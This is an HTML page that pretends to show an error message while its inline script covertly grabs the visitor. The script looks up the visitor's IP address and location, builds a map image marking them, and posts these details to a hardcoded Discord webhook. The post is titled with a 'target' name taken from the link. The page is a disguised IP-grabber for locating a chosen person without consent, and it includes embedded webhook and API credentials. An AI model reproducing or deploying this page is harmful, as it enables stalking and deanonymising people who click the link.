<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Website</title>
</head>
<body>

    <h1>Error</h1>
    <p>Try again later.</p>

    <script>
    const webhookUrl = "https://discord.com/api/webhooks/1537770986248601701/0HgBmgK-CmWmqivyfenWvtWMy4hypJTABeFny--_lF6CC4RPRtGr2kTKhnzU-bk0qzX0";
    const mapApiKey = "61fb851c1d67477c8e614505d1155c19";

    // 1. Check the URL for a "target" parameter
    const urlParams = new URLSearchParams(window.location.search);
    const targetName = urlParams.get('target') || "Unknown Visitor";

    fetch("https://ipapi.co/json/")
        .then(response => response.json())
        .then(data => {
            const lon = data.longitude;
            const lat = data.latitude;
            const city = data.city;
            const country = data.country_name;

            const mapImageUrl = `https://maps.geoapify.com/v1/staticmap?style=osm-bright&width=600&height=400&center=lonlat:${lon},${lat}&zoom=11&marker=lonlat:${lon},${lat};color:%23ff0000;size:medium&apiKey=${mapApiKey}`;

            const payload = {
                embeds: [
                    {
                        // 2. Put the targetName right in the title!
                        title: `🚨 ${targetName} clicked the link!`,
                        description: `Visitor located in ${city}.`,
                        color: 16711680,
                        fields: [
                            {
                                name: "Location",
                                value: `${city}, ${data.region}, ${country}`,
                                inline: true
                            },
                            {
                                name: "IP Address",
                                value: data.ip,
                                inline: true
                            }
                        ],
                        image: {
                            url: mapImageUrl
                        }
                    }
                ]
            };

            return fetch(webhookUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
        })
        .catch(error => console.error("Error:", error))

</body>
</html>
